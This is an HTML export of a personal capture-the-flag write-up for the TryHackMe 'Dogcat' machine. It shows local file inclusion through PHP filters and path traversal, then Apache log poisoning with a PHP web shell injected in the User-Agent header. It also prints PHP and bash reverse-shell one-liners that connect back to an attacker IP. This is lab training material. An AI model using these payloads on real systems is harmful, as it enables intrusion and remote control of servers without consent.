<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>dogcat</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>dogcat</h1><br/><strong><h1>THM Dogcat</h1></strong><br /><br /><br /><strong>Rustscan</strong><br /><img src="images/28-1.png" alt="images/28-1.png" /><br /><br /><strong>Nmap</strong><br /><img src="images/28-2.png" alt="images/28-2.png" /><br /><br /><strong>Gobuster</strong><br /><br /><br />Seeing the gobuster result. We try to access the flag.php file through LFI but it doesn&#39;t work normally.<br />It appears that this will only work if either “cat” or “dog” is part of the URL. Including dogs in the request and using path traversal after that to access the flag, with PHP filters:<br /><br />We check the following to bypass the PHP Filters<br /><strong>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</strong><br /><br /><img src="images/28-3.png" alt="images/28-3.png" /><br /><br />We got the code from above github page. Our code will be.<br /><br /><strong>http://10.10.69.53/?view=php://filter/convert.base64-encode/resource=dog</strong><br /><br /><img src="images/28-4.png" alt="images/28-4.png" /><br /><br />echo PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K | base64 -d<br /><br /><img src="images/28-5.png" alt="images/28-5.png" /><br /><strong>Above looks like contents of dog.php</strong><br /><br /><strong>Or</strong><br /><br /><strong>http://10.10.69.53/?view=php://filter/convert.base64-encode/resource=cat</strong><br /><br /><img src="images/28-6.png" alt="images/28-6.png" /><br /><br />echo PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K | base64 -d<br /><br /><img src="images/28-7.png" alt="images/28-7.png" /><br /><strong>Above looks like contents of cat.php</strong><br /><br />To get to the index file, we use the following<br />(Note: Can use either dog or cat)<br /><br /><img src="images/28-8.png" alt="images/28-8.png" /><br /><br />We got a long enocded text, so we go to view source.<br /><br /><img src="images/28-9.png" alt="images/28-9.png" /><br /><br />Upon decoding the above we find the code for <strong>index.php</strong><br /><br /><img src="images/28-10.png" alt="images/28-10.png" /><br /><br /><br />[&quot;ext&quot;] extention is used<br />To escape the extension, we will add a parameter as shown in the image below. Now when we try to read the /etc/passwd file, it is directly accessible. We have successfully exploited the Local File Inclusion.<br /><br /><strong>http://10.10.69.53/?view=cat/../../../../etc/passwd&amp;ext=</strong><br /><br />We use the <strong>&amp;ext=</strong> to bypass the filters.<br /><br /><strong>Directory Structure Guessed</strong><br /><br /><strong>/var/www/html/cat.php</strong><br />so we go with below<br /><strong>cat/../../../../etc/passwd</strong><br /><br /><img src="images/28-11.png" alt="images/28-11.png" /><br /><br />We successfully found LFI in the website.<br />Source code is below.<br /><img src="images/28-12.png" alt="images/28-12.png" /><br /><br /><br /><strong><h2>Foothold</h2></strong><br /><br />Next we will use <strong>“LFI”</strong> to exploit <strong>“Log Poisoning”</strong><br /><br />We check if access.log file can be used in LFI.<br /><br /><strong>http://10.10.69.53/?view=cat/../../../../var/log/apache2/access.log&amp;ext=</strong><br /><br /><img src="images/28-13.png" alt="images/28-13.png" /><br /><br />Viewing its source at the bottom area. (Last access logs) We find our previous code recorded in log. <br /><br />Intresting part is, the <strong>User-Agent</strong> part of the http request is copied to apache&#39;s access.log file. We will try to inject php code to accept a command from a variable.<br /><img src="images/28-14.png" alt="images/28-14.png" /><br /><br />We use Burpsuite to see the details and change our http request.<br /><img src="images/28-15.png" alt="images/28-15.png" /><br /><br />We then edit the <strong>User-Agent</strong> with a custom text say <strong>“Bazinga”</strong> and send the following <strong>http</strong> request.<br /><br /><img src="images/28-16.png" alt="images/28-16.png" /><br /><br />We check the html output and we find our string is refelcted on the page.<br /><br /><img src="images/28-17.png" alt="images/28-17.png" /><br /><br /><br />We use the same are to enter a php code that will run system commands from a GET varibale.<br /><strong>&lt;?php system($_GET[&#39;c&#39;]); ?&gt;</strong><br /><br /><img src="images/28-18.png" alt="images/28-18.png" /><br /><br />We send the updated request. We` can use <strong>“c”</strong> to send system commands using the <strong>&amp;ext=&amp;c=****</strong><br />As the log file is used. This command will be valid every time we open the log page.<br /><br /><strong>http://10.10.65.191/?view=cat/../../../../var/log/apache2/access.log&amp;ext=&amp;c=whoami</strong><br /><img src="images/28-19.png" alt="images/28-19.png" /><br /><br />We successfully get the output of <strong>whoami</strong> command at the place of our code.<br /><br /><strong>Important Note:</strong> Once the output is printed on the log file. We need to add the php code again in next request. Thus we use burpsuite to change both the <strong>User-Agent</strong> and <strong>URL</strong> <br /><br /><br />Now we can create a <strong>bash reverse shell</strong> and connect to the target machine using <strong>netcat</strong>.<br /><img src="images/28-20.png" alt="images/28-20.png" /><br /><br /><br /><br /><br /><strong>php -r &#39;$sock=fsockopen(&quot;10.8.6.75&quot;, 8888);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</strong><br /><br /><br /><img src="images/28-21.png" alt="images/28-21.png" /><br /><br /><br />10.10.245.74/?view=dog/../../../../var/log/apache2/access.log&amp;ext=&amp;c=php -r &#39;$sock=fsockopen(&quot;10.11.72.31&quot;,1337);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;<br />But we will use the URL encoded one after c=<br /><br /><br /><img src="images/28-22.png" alt="images/28-22.png" /><br /><br /><img src="images/28-23.png" alt="images/28-23.png" /><br /><br /><br /><strong><h1>OR</h1></strong><br /><br />We can use bash code as follows. <br /><br /><strong>/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.11.72.31/9999 0&gt;&amp;1&#39;</strong><br /><img src="images/28-24.png" alt="images/28-24.png" /><br /><br /><br />10.10.245.74/?view=dog/../../../../var/log/apache2/access.log&amp;ext=&amp;c=/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.11.72.31/9999 0&gt;&amp;1&#39;<br />But we will use the URL encoded one after c=<br /><br /><img src="images/28-25.png" alt="images/28-25.png" /><br /><br /><img src="images/28-26.png" alt="images/28-26.png" /><br /><br /><img src="images/28-27.png" alt="images/28-27.png" /><br /><br /><img src="images/28-28.png" alt="images/28-28.png" /><br /><br /><br /><strong><h2>Privilege Escalation</h2></strong><br /><br /><br /><img src="images/28-29.png" alt="images/28-29.png" /><br /><br /><br /><strong>Breaking out of Container</strong><br /><img src="images/28-30.png" alt="images/28-30.png" /><br /><br /><img src="images/28-31.png" alt="images/28-31.png" /></div>
</body>
</html>
